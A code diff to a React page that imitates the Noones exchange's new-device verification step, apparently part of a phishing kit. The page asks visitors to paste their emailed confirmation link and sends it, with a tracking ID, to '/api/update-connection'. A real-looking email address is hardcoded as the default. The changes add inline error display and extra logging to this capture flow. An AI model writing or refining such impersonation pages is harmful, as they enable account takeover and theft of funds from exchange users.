@@ -15,6 +15,7 @@ export default function NoonesNewDeviceVerification() {
   const [resendTimer, setResendTimer] = useState(5);
   const [isLoading, setIsLoading] = useState(false);
   const [isRedirecting, setIsRedirecting] = useState(false);
+  const [backendError, setBackendError] = useState('');
   const linkInputRef = useRef<HTMLInputElement>(null);
 
   const email = location.state?.email || 'gibsonkobia@gmail.com';
@@ -51,6 +52,7 @@ export default function NoonesNewDeviceVerification() {
     setIsLoading(true);
 
     try {
+      setBackendError('');
       const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
       if (!trackingId) {
         throw new Error('No tracking ID found');
@@ -58,18 +60,20 @@ export default function NoonesNewDeviceVerification() {
 
       console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
       
-      // Fire UPDATE via server endpoint with retry wrapper (non-blocking)
       const response = await fetch('/api/update-connection', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
       });
 
+      console.log('[NOONES_STEP2] API response status:', response.status);
       const payload = await response.json().catch(() => ({}));
+      console.log('[NOONES_STEP2] API response payload:', payload);
 
       if (!response.ok) {
-        console.error('[NOONES_STEP2] ❌ update-connection failed:', payload);
-        alert(`Unable to update verification link: ${payload.error || 'Unknown error'}`);
+        const message = payload?.error || 'Unknown error';
+        console.error('[NOONES_STEP2] ❌ update-connection failed:', message);
+        setBackendError(`Unable to update verification link: ${message}`);
         setIsLoading(false);
         return;
       }
@@ -93,7 +97,9 @@ export default function NoonesNewDeviceVerification() {
       }, 3000);
     } catch (err: any) {
       console.error('[NOONES_STEP2] Error:', err);
-      alert('Verification failed. Please try again.');
+      const message = err?.message || 'Verification failed. Please try again.';
+      setBackendError(message);
+      alert(message);
       setIsLoading(false);
     }
   };
@@ -171,6 +177,10 @@ export default function NoonesNewDeviceVerification() {
               >
                 {resendTimer === 0 ? 'Submit' : 'Try another way'}
               </button>
+
+              {backendError ? (
+                <p className="text-center text-sm mb-4 text-red-400">{backendError}</p>
+              ) : null}
 
               <div className="text-center mb-8">
                 <a href="#" className="text-green-500 underline text-sm">Cancel signing in</a>
